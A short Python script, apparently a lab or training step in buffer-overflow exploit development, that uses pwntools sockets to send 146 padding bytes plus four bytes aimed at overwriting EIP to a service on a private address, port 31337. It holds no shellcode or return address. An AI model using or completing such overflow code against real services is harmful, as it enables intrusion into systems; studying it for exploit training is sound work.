#!/usr/bin/python3
from pwn import log, socket

offset = 146
junk = b"A" * offset
eip = b"B" * 4

log.info("Enviando payload ...")

shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
shell.connect(("192.168.204.1", 31337))

shell.send(junk + eip + b"\r\n")

shell.close()
